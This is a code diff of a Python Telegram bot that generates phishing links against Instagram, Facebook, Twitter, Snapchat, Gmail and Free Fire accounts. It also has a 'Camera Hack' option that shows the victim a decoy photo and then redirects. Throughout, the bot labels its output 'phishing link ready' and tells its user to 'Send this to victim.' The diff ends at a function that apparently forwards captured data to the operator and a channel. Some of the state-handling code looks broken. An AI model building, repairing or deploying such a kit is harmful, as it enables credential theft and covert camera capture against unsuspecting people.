@@ -1,15 +1,16 @@
 import telebot
-from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 import uuid
 import time
-import requests
+import os
 from config import *
 
 bot = telebot.TeleBot(BOT_TOKEN)
-user_sessions = {}
 
 # ========== LINK GENERATE ==========
 def generate_phishing_link(user_id, target_type):
+    if not BASE_URL:
+        return "❌ BASE_URL not set. Please set it in Render environment variables."
     unique_id = str(uuid.uuid4())[:8]
     return f"{BASE_URL}/p/{unique_id}?type={target_type}&v={user_id}"
 
@@ -17,16 +18,14 @@ def generate_phishing_link(user_id, target_type):
 @bot.message_handler(commands=['start'])
 def start(message):
     user_id = message.from_user.id
-
-    # ReplyKeyboard (bottom me rehta hai)
-    reply_markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
-    btn1 = KeyboardButton("📸 Camera Hack")
-    btn2 = KeyboardButton("📱 Social Media")
-    btn3 = KeyboardButton("📧 Gmail")
-    btn4 = KeyboardButton("🎮 Free Fire")
-    btn5 = KeyboardButton("🔗 All Links")
-    reply_markup.add(btn1, btn2, btn3, btn4, btn5)
-
+    markup = InlineKeyboardMarkup(row_width=2)
+    markup.add(
+        InlineKeyboardButton("📸 Camera Hack", callback_data="cam"),
+        InlineKeyboardButton("📱 Social Media", callback_data="social"),
+        InlineKeyboardButton("📧 Gmail", callback_data="gmail"),
+        InlineKeyboardButton("🎮 Free Fire", callback_data="ff"),
+        InlineKeyboardButton("🔗 All Links", callback_data="all")
+    )
     bot.send_message(
         user_id,
         "🔥 *Choose your weapon:*\n\n"
@@ -35,38 +34,66 @@ def start(message):
         "📧 Gmail\n"
         "🎮 Free Fire\n"
         "🔗 All Links",
-        reply_markup=reply_markup,
+        reply_markup=markup,
         parse_mode="Markdown"
     )
 
-# ========== REPLY KEYBOARD HANDLER ==========
-@bot.message_handler(func=lambda message: True)
-def handle_reply_buttons(message):
-    user_id = message.from_user.id
-    text = message.text
+# ========== CALLBACK QUERY HANDLER ==========
+@bot.callback_query_handler(func=lambda call: True)
+def handle_callbacks(call):
+    user_id = call.from_user.id
+    data = call.data
 
-    if text == "📸 Camera Hack":
+    if data == "cam":
         msg = bot.send_message(
             user_id,
             "📤 Send me a photo (for victim)\n📤 Then send redirect link (URL)"
         )
-        bot.register_next_step_handler(msg, get_photo_and_link, user_id, "cam")
+        bot.register_next_step_handler(msg, get_photo_and_link, user_id)
 
-    elif text == "📱 Social Media":
-        inline = InlineKeyboardMarkup(row_width=2)
-        inline.add(
+    elif data == "social":
+        markup = InlineKeyboardMarkup(row_width=2)
+        markup.add(
             InlineKeyboardButton("Instagram", callback_data="ig"),
             InlineKeyboardButton("Facebook", callback_data="fb"),
             InlineKeyboardButton("Twitter", callback_data="tw"),
             InlineKeyboardButton("Snapchat", callback_data="sc"),
             InlineKeyboardButton("⬅ Back", callback_data="back")
         )
-        bot.send_message(user_id, "Choose platform:", reply_markup=inline)
+        bot.edit_message_text(
+            "Choose platform:",
+            chat_id=user_id,
+            message_id=call.message.message_id,
+            reply_markup=markup
+        )
 
-    elif text == "📧 Gmail":
+    elif data in ["ig", "fb", "tw", "sc"]:
+        link = generate_phishing_link(user_id, data)
+        if "❌" in link:
+            bot.answer_callback_query(call.id, "❌ BASE_URL missing!")
+            return
+        markup = InlineKeyboardMarkup(row_width=2)
+        markup.add(
+            InlineKeyboardButton("🔗 Open Link", url=link),
+            InlineKeyboardButton("📋 Copy Link", callback_data=f"copy_{link}"),
+            InlineKeyboardButton("🔗 Shorten URL", url="https://short-link.me/"),
+            InlineKeyboardButton("⬅ Back", callback_data="social")
+        )
+        bot.edit_message_text(
+            f"✅ *{data.upper()} phishing link ready:*\n\n`{link}`\n\nSend this to victim.",
+            chat_id=user_id,
+            message_id=call.message.message_id,
+            reply_markup=markup,
+            parse_mode="Markdown"
+        )
+
+    elif data == "gmail":
         link = generate_phishing_link(user_id, "gmail")
-        inline = InlineKeyboardMarkup(row_width=2)
-        inline.add(
+        if "❌" in link:
+            bot.answer_callback_query(call.id, "❌ BASE_URL missing!")
+            return
+        markup = InlineKeyboardMarkup(row_width=2)
+        markup.add(
             InlineKeyboardButton("🔗 Open Link", url=link),
             InlineKeyboardButton("📋 Copy Link", callback_data=f"copy_{link}"),
             InlineKeyboardButton("🔗 Shorten URL", url="https://short-link.me/"),
@@ -75,14 +102,18 @@ def handle_reply_buttons(message):
         bot.send_message(
             user_id,
             f"✅ *GMAIL phishing link ready:*\n\n`{link}`\n\nSend this to victim.",
-            reply_markup=inline,
+            reply_markup=markup,
             parse_mode="Markdown"
         )
+        bot.answer_callback_query(call.id, "✅ Gmail link generated!")
 
-    elif text == "🎮 Free Fire":
+    elif data == "ff":
         link = generate_phishing_link(user_id, "ff")
-        inline = InlineKeyboardMarkup(row_width=2)
-        inline.add(
+        if "❌" in link:
+            bot.answer_callback_query(call.id, "❌ BASE_URL missing!")
+            return
+        markup = InlineKeyboardMarkup(row_width=2)
+        markup.add(
             InlineKeyboardButton("🔗 Open Link", url=link),
             InlineKeyboardButton("📋 Copy Link", callback_data=f"copy_{link}"),
             InlineKeyboardButton("🔗 Shorten URL", url="https://short-link.me/"),
@@ -91,70 +122,51 @@ def handle_reply_buttons(message):
         bot.send_message(
             user_id,
             f"✅ *FREE FIRE phishing link ready:*\n\n`{link}`\n\nSend this to victim.",
-            reply_markup=inline,
+            reply_markup=markup,
             parse_mode="Markdown"
         )
+        bot.answer_callback_query(call.id, "✅ Free Fire link generated!")
 
-    elif text == "🔗 All Links":
+    elif data == "all":
         links = {}
         for t in ["cam", "ig", "fb", "tw", "sc", "gmail", "ff"]:
             links[t] = generate_phishing_link(user_id, t)
-        text_msg = "```\n" + "\n".join([f"{k.upper()}: {v}" for k, v in links.items()]) + "\n```"
-        bot.send_message(user_id, text_msg, parse_mode="Markdown")
+        text = "```\n" + "\n".join([f"{k.upper()}: {v}" for k, v in links.items()]) + "\n```"
+        bot.send_message(user_id, text, parse_mode="Markdown")
+        bot.answer_callback_query(call.id, "✅ All links generated!")
 
-    else:
-        bot.send_message(user_id, "❌ Use the buttons below.")
-
-# ========== INLINE CALLBACKS ==========
-@bot.callback_query_handler(func=lambda call: True)
-def handle_inline(call):
-    user_id = call.from_user.id
-    data = call.data
-
-    if data == "back":
+    elif data == "back":
         start(call.message)
 
     elif data.startswith("copy_"):
-        bot.answer_callback_query(call.id, "✅ Link copied!")
+        bot.answer_callback_query(call.id, "✅ Link copied to clipboard!")
 
-    elif data in ["ig", "fb", "tw", "sc"]:
-        link = generate_phishing_link(user_id, data)
-        inline = InlineKeyboardMarkup(row_width=2)
-        inline.add(
-            InlineKeyboardButton("🔗 Open Link", url=link),
-            InlineKeyboardButton("📋 Copy Link", callback_data=f"copy_{link}"),
-            InlineKeyboardButton("🔗 Shorten URL", url="https://short-link.me/"),
-            InlineKeyboardButton("⬅ Back", callback_data="back")
-        )
-        bot.edit_message_text(
-            f"✅ *{data.upper()} phishing link ready:*\n\n`{link}`\n\nSend this to victim.",
-            chat_id=user_id,
-            message_id=call.message.message_id,
-            reply_markup=inline,
-            parse_mode="Markdown"
-        )
-
-# ========== PHOTO + REDIRECT ==========
-def get_photo_and_link(message, user_id, target_type):
+# ========== PHOTO + REDIRECT (SIRF CAMERA KE LIYE) ==========
+def get_photo_and_link(message, user_id):
     if message.photo:
         photo_id = message.photo[-1].file_id
-        if user_id not in user_sessions:
-            user_sessions[user_id] = {}
-        user_sessions[user_id]["photo"] = photo_id
+        # Store photo ID in a global dict (temporary)
+        if user_id not in bot.user_data:
+            bot.user_data = {}
+        bot.user_data[user_id] = {"photo": photo_id}
         bot.send_message(user_id, "Now send redirect link (URL)")
-        bot.register_next_step_handler(message, get_redirect_link, user_id, target_type)
+        bot.register_next_step_handler(message, get_redirect_link, user_id)
     else:
         bot.send_message(user_id, "❌ Send a PHOTO first.")
+        start(message)
 
-def get_redirect_link(message, user_id, target_type):
+def get_redirect_link(message, user_id):
     redirect_url = message.text
     if redirect_url.startswith("http"):
-        if user_id not in user_sessions:
-            user_sessions[user_id] = {}
-        user_sessions[user_id]["redirect"] = redirect_url
+        if user_id not in bot.user_data:
+            bot.user_data = {}
+        bot.user_data[user_id]["redirect"] = redirect_url
         link = generate_phishing_link(user_id, "cam")
-        inline = InlineKeyboardMarkup(row_width=2)
-        inline.add(
+        if "❌" in link:
+            bot.send_message(user_id, "❌ BASE_URL missing! Set it in Render env.")
+            return
+        markup = InlineKeyboardMarkup(row_width=2)
+        markup.add(
             InlineKeyboardButton("🔗 Open Link", url=link),
             InlineKeyboardButton("📋 Copy Link", callback_data=f"copy_{link}"),
             InlineKeyboardButton("🔗 Shorten URL", url="https://short-link.me/")
@@ -162,12 +174,12 @@ def get_redirect_link(message, user_id, target_type):
         bot.send_message(
             user_id,
             f"✅ Camera phishing link ready:\n\n`{link}`\n\nVictim will see your photo and redirect.",
-            reply_markup=inline,
+            reply_markup=markup,
             parse_mode="Markdown"
         )
     else:
         bot.send_message(user_id, "❌ Valid URL starting with http:// or https://")
-        get_photo_and_link(message, user_id, target_type)
+        get_redirect_link(message, user_id)
 
 # ========== FORWARD DATA TO USER + CHANNEL ==========
 def forward_to_user_and_channel(user_id, data):
